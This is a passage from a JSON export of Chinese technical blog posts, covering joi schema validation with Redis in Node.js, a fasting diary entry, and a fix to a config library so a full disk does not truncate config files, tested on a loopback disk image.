stoped.<\/span>\n}\n<\/pre>\n<\/div>\n\n<p>\n\u5982\u679c\u624b\u5de5\u8f6c\u6362\u6210\u6b63\u786e\u7684\u7c7b\u578b\u80af\u5b9a\u8981\u5199\u5f88\u591a\u6837\u677f\u4ee3\u7801\u4e86\u3002\n<\/p>\n<\/li>\n\n<li>\u5bf9\u8c61\u6a21\u5f0f\u9a8c\u8bc1\u6a21\u5757 <a href=\"https:\/\/github.com\/hapijs\/joi#anydefaultvalue-description\">joi<\/a>\n\n<p>\n\u6709\u5f88\u591a\u7684ORM\uff08 Object Relational Mapping \u5bf9\u8c61\u5173\u7cfb\u6620\u5c04\uff09\u5e93\u90fd\u80fd\u591f\u5b9e\u73b0\u5f3a\u7c7b\u578b\u7684\u6570\u636e\u6a21\u578b\uff0c\u4f46\u662f\u5b83\u4eec\u90fd\u76f8\u5f53\u7684\u590d\u6742\uff0c\u652f\u6301\u5404\u79cd\u5404\u6837\u7684\u6570\u636e\u5e93\u540e\u7aef\uff0c\u652f\u6301\u4e00\u5bf9\u4e00\u3001\u4e00\u5bf9\u591a\u3001\u591a\u5bf9\u591a\u7b49\u6570\u636e\u5173\u7cfb\uff0c\u4f46\u662f\u5f88\u5c11\u652f\u6301\u5206\u8868\u5206\u5e93\uff0c\u6211\u4eec\u7684\u7cfb\u7edf\u4e00\u822c\u662f\u6570\u636e\u6a21\u578b\u7b80\u5355\u4f46\u8981\u8003\u8651\u7528\u6237\u91cf\u5927\u4e86\u6a2a\u5411\u6269\u5c55\uff0c\u6240\u4ee5\u4e00\u5f00\u59cb\u5c31\u8fdb\u884c\u4e86\u5206\u8868\u5206\u5e93\uff0c\u65e0\u6cd5\u4f7f\u7528\u91cd\u578b\u7684ORM\u3002\n<\/p>\n\n<p>\n\u5982\u679c\u6709\u4e00\u4e2a\u80fd\u591f\u81ea\u52a8\u6839\u636e\u6a21\u5f0f\uff08Schema\uff09\u5b9a\u4e49\u5bf9\u503c\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362\u7684\u5e93\uff0c\u4e00\u5b9a\u4f1a\u975e\u5e38\u6709\u7528\u3002\n<\/p>\n\n<p>\n<a href=\"https:\/\/github.com\/hapijs\/joi#anydefaultvalue-description\">joi<\/a> \u4e00\u4e2aJavascript\u5bf9\u8c61\u6a21\u5f0f\u63cf\u8ff0\u8bed\u8a00\u4ee5\u53ca\u9a8c\u8bc1\uff08Object schema description language and validator for JavaScript objects\uff09\u7684\u5e93\uff0c\u5b83\u53ef\u4ee5\u5b8c\u6210\u5bf9\u8c61\u7c7b\u578b\u8f6c\u6362\u4ee5\u53ca\u5408\u6cd5\u6027\u9a8c\u8bc1\u3002\n<\/p>\n<\/li>\n\n<li><a href=\"https:\/\/github.com\/hapijs\/joi#anydefaultvalue-description\">joi<\/a> \u7684\u7528\u6cd5\u793a\u4f8b\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">joi<\/span> = require(<span style=\"color: #66cccc;\">'joi'<\/span>);\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">redis<\/span> = require(<span style=\"color: #66cccc;\">'redis'<\/span>);\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">client<\/span> = redis.createClient(6379, <span style=\"color: #66cccc;\">'127.0.0.1'<\/span>);\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">User<\/span> = <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">options<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (! options) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   options = {};\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">this<\/span>.id = options.id || 0;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">this<\/span>.name = options.name || <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">this<\/span>.male = options.male || <span style=\"color: #6699cc;\">true<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">this<\/span>.birthday = options.birthday;\n};\n\nUser.schema = joi.object().keys({\n<span style=\"background-color: #515151;\"> <\/span>   id: joi.number().integer().min(1),\n<span style=\"background-color: #515151;\"> <\/span>   name: joi.string().required(),\n<span style=\"background-color: #515151;\"> <\/span>   male: joi.<span style=\"color: #6699cc;\">boolean<\/span>().<span style=\"color: #99cc99;\">default<\/span>(<span style=\"color: #6699cc;\">true<\/span>),\n<span style=\"background-color: #515151;\"> <\/span>   birthday: joi.date().required()\n});\n\nUser.find = <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">id<\/span>, <span style=\"color: #ffcc66;\">callback<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   client.hgetall(<span style=\"color: #66cccc;\">\"user:\"<\/span> + id, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">err<\/span>, <span style=\"color: #ffcc66;\">value<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (err) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> callback(err);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> <span style=\"color: #99cc99;\">if<\/span> (! value) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> callback(<span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">Error<\/span>(<span style=\"color: #66cccc;\">\"User not found\"<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   joi.validate(value, User.schema, callback);\n<span style=\"background-color: #515151;\"> <\/span>   });\n};\n\nUser.<span style=\"color: #6699cc;\">prototype<\/span>.save = <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">callback<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">value<\/span> = {};\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span>(<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">fieldName<\/span> <span style=\"color: #99cc99;\">in<\/span> <span style=\"color: #6699cc;\">this<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #99cc99;\">typeof<\/span>(<span style=\"color: #6699cc;\">this<\/span>[fieldName]) != <span style=\"color: #66cccc;\">'function'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   value[fieldName] = <span style=\"color: #6699cc;\">this<\/span>[fieldName];\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   joi.validate(value, User.schema, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">err<\/span>, <span style=\"color: #ffcc66;\">validatedValue<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (err) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> callback(err);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   client.hmset(<span style=\"color: #66cccc;\">\"user:\"<\/span> + validatedValue.id, validatedValue, callback);\n<span style=\"background-color: #515151;\"> <\/span>   });\n};\n\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">user<\/span> = <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">User<\/span>({\n<span style=\"background-color: #515151;\"> <\/span>   id: 1,\n<span style=\"background-color: #515151;\"> <\/span>   name: <span style=\"color: #66cccc;\">\"txf\"<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   male: <span style=\"color: #6699cc;\">true<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   birthday: <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">Date<\/span>(<span style=\"color: #66cccc;\">\"1983-03-22\"<\/span>)\n});\n\nuser.save(<span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">err<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (err) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   console.error(<span style=\"color: #66cccc;\">\"user save error(\"<\/span> + err.toString() + <span style=\"color: #66cccc;\">\")\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   client.quit();\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   console.info(<span style=\"color: #66cccc;\">\"user saved\"<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   User.find(user.id, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">err<\/span>, <span style=\"color: #ffcc66;\">user<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   client.quit();\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (err) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   console.error(<span style=\"color: #66cccc;\">\"user find error(\"<\/span> + err.toString() + <span style=\"color: #66cccc;\">\")\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   console.log(<span style=\"color: #66cccc;\">\"user found: \"<\/span> + JSON.stringify(user));\n<span style=\"background-color: #515151;\"> <\/span>   });\n});\n<\/pre>\n<\/div>\n\n<p>\n\u8fd0\u884c\u7ed3\u679c\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">user saved\nuser found: {<span style=\"color: #66cccc;\">\"id\"<\/span>:1,<span style=\"color: #66cccc;\">\"name\"<\/span>:<span style=\"color: #66cccc;\">\"txf\"<\/span>,<span style=\"color: #66cccc;\">\"male\"<\/span>:<span style=\"color: #6699cc;\">true<\/span>,<span style=\"color: #66cccc;\">\"birthday\"<\/span>:<span style=\"color: #66cccc;\">\"1983-03-22T00:00:00.000<\/span><span style=\"color: #66cccc; text-decoration: underline;\">Z\"<\/span><span style=\"text-decoration: underline;\">}<\/span>\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n"
},
{
  "title": "\u8f7b\u65ad\u98df\u65e5\uff082015-7-17\uff09",
  "timestamp": "2015-07-17 14:28:00",
  "tags": [
    "\u8f7b\u65ad\u98df"
  ],
  "body": "<p>\n\u4eca\u5929\u662f\u8f7b\u65ad\u98df\u65e5\uff0c\u6628\u5929\u665a\u4e0a10\u70b9\u591a\u5403\u8fc7\u6c34\u679c\u540e\u5230\u73b0\u5728\u8fd8\u6ca1\u6709\u5403\u8fc7\u4e1c\u897f\uff0c\u4e0a\u5348\u8d77\u5f97\u5f88\u665a\uff0c\u6700\u8fd1\u5de5\u4f5c\u592a\u7d2f\u4e86\u3002\u4e2d\u5348\u5fd8\u70b9\u9910\u5e72\u8106\u65ad\u98df\u7b97\u4e86\uff0c\u4e0b\u4e00\u987f\u8981\u523018\u70b9\u7684\u665a\u9910\uff0c\u5df2\u7ecf\u6ce1\u597d\u4e86\u4e0b\u5348\u8336\uff0c\u809a\u5b50\u6709\u70b9\u6491\uff08\u4e3a\u4ec0\u4e48\u4e0d\u89c9\u5f97\u5f88\u997f\u5462\uff1f\uff09\uff0c\u6709\u65f6\u5019\u53c8\u4f1a\u89c9\u5f97\u809a\u5b50\u6709\u70b9\u997f\u5f97\u614c\uff0c\u4f46\u4ed4\u7ec6\u4e00\u4f53\u4f1a\u5176\u5b9e\u662f\u6700\u8fd1\u56e0\u4e3a\u5de5\u4f5c\u6709\u70b9\u7126\u8651\u3002\n<\/p>\n\n<p>\n\u73b0\u5728\u662f66.5\u516c\u65a4\uff0c\u4e3b\u8981\u662f\u809a\u5b50\u7626\u4e86\u4e9b\uff0c\u7ee7\u7eed\u52a0\u6cb9\u3002<\/p>\n"
},
{
  "title": "config\u5e93\u907f\u514d\u78c1\u76d8\u6ee1\u65f6\u914d\u7f6e\u6587\u4ef6\u88ab\u622a\u65ad",
  "timestamp": "2015-07-20 17:35:00",
  "tags": [
    "linux",
    "c"
  ],
  "body": "<p>\n<a href=\"https:\/\/github.com\/tangxinfa\/config\">config<\/a> \u5e93\u5728\u5b9e\u9645\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u4e00\u4e2a\u95ee\u9898\uff1a\u78c1\u76d8\u6ee1\u65f6\u5199\u914d\u7f6e\u6587\u4ef6\u53ef\u80fd\u5bfc\u81f4\u914d\u7f6e\u6587\u4ef6\u88ab\u6e05\u7a7a\uff08\u6587\u4ef6\u5927\u5c0f\u4e3a0\uff09\u3002\n<\/p>\n\n<p>\n\u60f3\u5230\u4e24\u79cd\u65b9\u6848\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u5199-\u66ff\u6362\n\n<p>\n\u5148\u5199\u5230\u4e00\u4e2a\u4e34\u65f6\u6587\u4ef6\uff0c\u5199\u6210\u529f\u540e\u66ff\u6362\u76ee\u6807\u6587\u4ef6\uff0c\u8fd9\u662f\u7531linux\u4e0b\u91cd\u547d\u540d\uff08rename\uff09\u6587\u4ef6\u7684\u539f\u5b50\u6027\u4fdd\u8bc1\u7684\u3002\u7531\u4e8e\u6211\u4eec\u662f\u901a\u8fc7\u5bf9\u914d\u7f6e\u6587\u4ef6\u52a0\u9501\u7684\u65b9\u5f0f\u652f\u6301\u591a\u8fdb\u7a0b\u8bbf\u95ee\u7684\uff0c\u53ef\u4ee5\u5bf9\u914d\u7f6e\u6587\u4ef6\u4f7f\u7528\u72ec\u7acb\u7684\u9501\u6587\u4ef6\uff0c\u4e00\u60f3\u8d77\u5230\u914d\u7f6e\u6587\u4ef6\u76ee\u5f55\u91cc\u5c06\u51fa\u73b0\u4e00\u5927\u5806\u9501\u6587\u4ef6\uff0c\u80c3\u5c31\u4e0d\u8212\u670d\u3002\n<\/p>\n<\/li>\n\n<li>\u9884\u5206\u914d\u7a7a\u95f4\n\n<p>\n\u5148\u786e\u4fdd\u6587\u4ef6\u62e5\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u518d\u5199\u5165\u3002\u867d\u7136\u4e0d\u662f\u539f\u5b50\u6027\u7684\uff0c\u4f46\u5df2\u7ecf\u80fd\u591f\u89e3\u51b3\u95ee\u9898\u3002\u6211\u6bd4\u8f83\u503e\u5411\u4e8e\u8fd9\u4e2a\u65b9\u6848\u3002\n<\/p>\n<\/li>\n<\/ul>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u901a\u8fc7\u9884\u5206\u914d\u7a7a\u95f4\u65b9\u5f0f\u5b89\u5168\u5199\u6587\u4ef6\u7b97\u6cd5<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>\u5982\u679c\u5f53\u524d\u6587\u4ef6\u8fc7\u5c0f\uff08\u4e0d\u8db3\u4ee5\u5bb9\u7eb3\u65b0\u5185\u5bb9\uff09\uff0c\u5728\u6587\u4ef6\u5c3e\u90e8\u901a\u8fc7\u8ffd\u52a0\u5360\u4f4d\u5b57\u7b26\uff08\\0\uff09\u76f4\u5230\u6587\u4ef6\u5927\u5c0f\u5408\u9002\n<\/li>\n\n<li>\u5199\u5165\u65b0\u5185\u5bb9\n<\/li>\n\n<li>\u5c06\u8fc7\u591a\u7684\u7a7a\u95f4\u622a\u6389\n<\/li>\n<\/ul>\n\n<p>\n\u5177\u4f53\u5b9e\u73b0\u53c2\u89c1\uff1a <a href=\"https:\/\/github.com\/tangxinfa\/config\/commit\/5ed686fc42c3356658d67d2d3bb59d3435f8c68f\">5ed686f Fix bug: config file content missing when disk full<\/a> .\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u6d4b\u8bd5<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<\/div><div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"sec-2-1\">\u521b\u5efa\u6a21\u62df\u78c1\u76d8\u76ee\u5f55 \/mnt\/disk<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-1\">\n<p>\n\u5148\u786e\u4fdd\u5b58\u5728 <code>\/dev\/loop*<\/code> \u8bbe\u5907\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u5148\u5c1d\u8bd5\u6302\u8f7d <code>loop<\/code> \u5185\u6838\u6a21\u5757\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo modprobe loop\n<\/pre>\n<\/div>\n\n<p>\n\u5982\u679c\u8fd8\u662f\u6ca1\u6709 <code>loop<\/code> \u8bbe\u5907\uff0c\u53ef\u80fd\u662f\u6700\u8fd1\u8fdb\u884c\u4e86\u7cfb\u7edf\u5347\u7ea7\uff0c\u91cd\u542f\u540e\u518d\u8bd5\u3002\n<\/p>\n\n<p>\n\u521b\u5efa\u6a21\u62df\u78c1\u76d8\uff08\/mnt\/disk\uff09\uff1a\n<\/p>\n\n<pre class=\"example\">\n$ sudo dd if=\/dev\/zero of=~\/Examples\/disk.img bs=8M count=1\n$ sudo losetup \/dev\/loop0 ~\/Examples\/disk.img\n$ sudo parted \/dev\/loop0\nGNU Parted 3.2\nUsing \/dev\/loop0\nWelcome to GNU Parted! Type 'help' to view a list of commands.\n(parted) mklabel gpt\nWarning: The existing disk label on \/dev\/loop0 will be destroyed and all data on\nthis disk will be lost. Do you want to continue?\nYes\/No? yes\n(parted) mkpart primary 0MB 8MB\nWarning: The resulting partition is not properly aligned for best performance.\nIgnore\/Cancel? Ignore\n(parted) print\nModel: Loopback device (loopback)\nDisk \/dev\/loop0: 8389kB\nSector size (logical\/physical): 512B\/512B\nPartition Table: gpt\nDisk Flags: \n\nNumber  Start   End     Size    File system  Name  Flags\n 1      17.4kB  8372kB  8354kB\n\n(parted) quit\n$ sudo mkfs.ext4 \/dev\/loop0p1\n$ sudo mkdir \/mnt\/disk\n$ sudo mount \/dev\/loop0p1 \/mnt\/disk\n<\/pre>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"sec-2-2\">\u4fee\u590d\u524d<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-2\">\n<p>\n\u78c1\u76d8\u7a7a\u95f4\u4e0d\u8db3\u5199\u914d\u7f6e\u5bfc\u81f4\u914d\u7f6e\u6587\u4ef6\u88ab\u635f\u574f\n<\/p>\n\n<pre class=\"example\">\n$ sudo ~\/Opensource\/config\/config \/mnt\/disk\/test.json set name libconfig\nname: libconfig\n$ sudo dd if=\/dev\/zero of=\/mnt\/disk\/other.data bs=1 obs=1 count=100000000\ndd: error writing \u2018\/mnt\/disk\/other.data\u2019: No space left on device\n6821889+0 records in\n6821888+0 records out\n6821888 bytes (6.8 MB) copied, 7.44769 s, 916 kB\/s\ndd: error writing \u2018\/mnt\/disk\/other.data\u2019: No space left on device\n6821889+0 records in\n6821888+0 records out\n6821888 bytes (6.8 MB) copied, 7.53017 s, 906 kB\/s\n$ sudo ~\/Opensource\/config\/config \/mnt\/disk\/test.json set data \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\nconfig: write: No space left on device\nconfig: save config file(\/mnt\/disk\/test.json) failed\ndata: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n$ sudo ~\/Opensource\/config\/config \/mnt\/disk\/test.json get name\nconfig: get items(name,,,,,) from config file(\/mnt\/disk\/test.json) failed\n<\/pre>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2-3\" class=\"outline-3\">\n<h3 id=\"sec-2-3\">\u4fee\u590d\u540e<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-3\">\n<p>\n\u78c1\u76d8\u7a7a\u95f4\u4e0d\u8db3\u5199\u914d\u7f6e\u4e0d\u4f1a\u5bf9\u914d\u7f6e\u6587\u4ef6\u9020\u6210\u5b9e\u8d28\u5f71\u54cd\n<\/p>\n\n<pre class=\"example\">\n$ sudo ~\/Opensource\/config\/config \/mnt\/disk\/test.json set name libconfig\nname: libconfig\n$ sudo dd if=\/dev\/zero of=\/mnt\/disk\/other.data bs=1 obs=1 count=100000000\ndd: error writing \u2018\/mnt\/disk\/other.data\u2019: No space left on device\n6821889+0 records in\n6821888+0 records out\n6821888 bytes (6.8 MB) copied, 7.6254 s, 895 kB\/s\n$ sudo ~\/Opensource\/config\/config \/mnt\/disk\/test.json set data \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\nconfig: write: No space left on device\nconfig: save config file(\/mnt\/disk\/test.json) failed\ndata: 